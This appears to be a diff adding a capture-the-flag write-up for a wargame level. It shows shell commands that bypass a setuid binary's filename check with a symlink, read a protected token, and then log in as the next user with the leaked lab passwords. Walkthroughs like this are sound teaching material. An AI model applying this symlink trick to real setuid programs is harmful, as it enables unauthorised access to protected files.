@@ -1,0 +1,58 @@
+$ ls -l
+-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
+-rw-------  1 flag08 flag08    26 Mar  5  2016 token
+
+$strings level08
+
+we see the strings :
+	%s [file to read]
+	token
+	You may not access '%s'
+	Unable to open %s
+	Unable to read fd %d
+
+we see the fct :
+	strstr
+	printf
+	read
+	open
+
+$ echo "TESTEST" > /tmp/ok
+$./level08 /tmp/ok
+ TESTEST
+
+$ ./level08 token
+You may not access 'token'
+
+So the program does strstr with our arg comparing it with the string "token"
+
+something like: 
+
+if strstr(argv[1], "token")
+{
+	printf("You may not access '%s'", "token");
+	exit();
+}
+
+
+
+we can try copy file token and rename it 
+$ cp ~/token /tmp/test
+cp: cannot open `/home/user/level08/token' for reading: Permission denied
+
+we have no permission... we can try with a symlink to trick level08 program with different filename
+
+ln -s /home/user/level08/token /tmp/nekot && ./level08 /tmp/nekot
+quif5eloekouj29ke0vouxean
+
+and it works
+
+$ su flag08
+password : quif5eloekouj29ke0vouxean
+
+$getflag 
+25749xKZ8L7DkSCwJkT9dyv6f
+
+$su level09
+password : 25749xKZ8L7DkSCwJkT9dyv6f
+
